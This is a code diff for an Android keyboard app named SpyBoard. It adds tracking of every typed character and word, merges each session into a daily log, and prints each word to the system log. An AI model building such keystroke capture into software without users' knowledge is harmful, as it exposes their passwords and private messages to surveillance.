@@ -3,16 +3,17 @@ package com.idankorenisraeli.spyboard.input;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
 import android.text.TextUtils;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
+import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputConnection;
 
 import com.idankorenisraeli.spyboard.data.DailyUsageLog;
 import com.idankorenisraeli.spyboard.data.FirebaseManager;
+import com.idankorenisraeli.spyboard.data.UsageLog;
 import com.idankorenisraeli.spyboard.utils.KeycodeDictionary;
 import com.idankorenisraeli.spyboard.R;
-
-import java.util.HashMap;
 
 /**
  * This class will simulate the functionality of an android keyboard,
@@ -21,13 +22,21 @@ import java.util.HashMap;
 public class SpyInputMethodService extends android.inputmethodservice.InputMethodService {
 
     SpyKeyboardView keyboardView;
-
     KeycodeDictionary dictionary;
 
     boolean caps = false;
     boolean hebrewMode = false;
 
     Keyboard engKeyboard, hebKeyboard;
+
+    String currentDate;
+    DailyUsageLog dailyLog;
+    UsageLog usageLog;
+
+    private static final int AVG_WORD_LENGTH = 16;
+
+    StringBuilder currentWord = new StringBuilder(AVG_WORD_LENGTH);
+
 
 
     interface KEYS{
@@ -50,31 +59,16 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
         FirebaseManager firebaseManager = FirebaseManager.getInstance();
 
-
-        DailyUsageLog log = new DailyUsageLog();
-        HashMap<String, Integer> charFreq = new HashMap<>();
-        charFreq.put("k", 2);
-        charFreq.put("v", 3);
-        charFreq.put("c", 1);
-        log.setCharFreq(charFreq);
-
-        HashMap<String, Integer> wordsFreq = new HashMap<>();
-        wordsFreq.put("abc", 2);
-        wordsFreq.put("test", 1);
-
-        log.setWordFreq(wordsFreq);
-
-        firebaseManager.saveDailyLog(log);
-
         return keyboardView;
     }
 
+
+    //region Keyboard Actions
     private void languageAction(){
         hebrewMode = !hebrewMode;
         keyboardView.setKeyboard(hebrewMode ? hebKeyboard : engKeyboard);
         // Updating the keyboard view based on the current mode
     }
-
 
     private void deleteAction(InputConnection ic){
         CharSequence selectedText = ic.getSelectedText(0);
@@ -96,31 +90,47 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
     }
 
-
     private void charAction(int primaryCode, InputConnection ic){
+        String typed = codeToString(primaryCode);
+        ic.commitText(typed, 1); //writing to screen
 
-        char code;
+        trackKeyPress(typed);
+    }
+
+    private void trackKeyPress(String typed){
+        if(typed.equals(" ")){
+            usageLog.addWord(currentWord.toString());
+            Log.i("pttt", "Adding word " + currentWord.toString() + " HEY");
+            currentWord = new StringBuilder(AVG_WORD_LENGTH);
+            //reset the strbuilder
+        }
+        else
+            currentWord.append(typed); //Calculating the word
+
+        if(usageLog!=null)
+            usageLog.addChar(typed);
+    }
+
+    private String codeToString(int primaryCode){
+        char finalCode;
         if(hebrewMode){
-            code = dictionary.engToHeb(primaryCode);
+            finalCode = dictionary.engToHeb(primaryCode);
         }
         else{
             primaryCode = caps ? primaryCode + ('A' - 'a') : primaryCode; // converting to upper case when shift
-            code = (char) primaryCode; // converting to char
+            finalCode = (char) primaryCode; // converting to char
         }
 
-        ic.commitText(String.valueOf(code), 1); //writing to screen
 
-        // TODO: 30/12/2020 Add tacking of this key
+        return String.valueOf(finalCode);
     }
 
+    //endregion
 
-
-    // TODO: 30/12/2020 Add spacebar tacking
 
     KeyboardView.OnKeyboardActionListener keyBoardAction = new KeyboardView.OnKeyboardActionListener() {
         @Override
         public void onPress(int primaryCode) {
-
         }
 
         @Override
@@ -155,7 +165,6 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
         @Override
         public void onText(CharSequence text) {
-
         }
 
         @Override
@@ -178,4 +187,35 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
         }
     };
+
+
+    @Override
+    public void onStartInputView(EditorInfo info, boolean restarting) {
+        super.onStartInputView(info, restarting);
+
+        if(dailyLog == null) {
+            dailyLog = new DailyUsageLog();
+            //TODO - CHECK WITH FIREBASE/SP
+            currentDate = dailyLog.getDate();
+        }
+
+        Log.i("pttt", currentDate);
+
+        usageLog = new UsageLog();
+        // New keyboard usage
+
+    }
+
+
+    @Override
+    public void onFinishInputView(boolean finishingInput) {
+        super.onFinishInputView(finishingInput);
+
+        //TODO - track last word
+
+        if(dailyLog!=null)
+            dailyLog.addLog(usageLog);
+        //Adding the session data that is finished to the day's total
+
+    }
 }
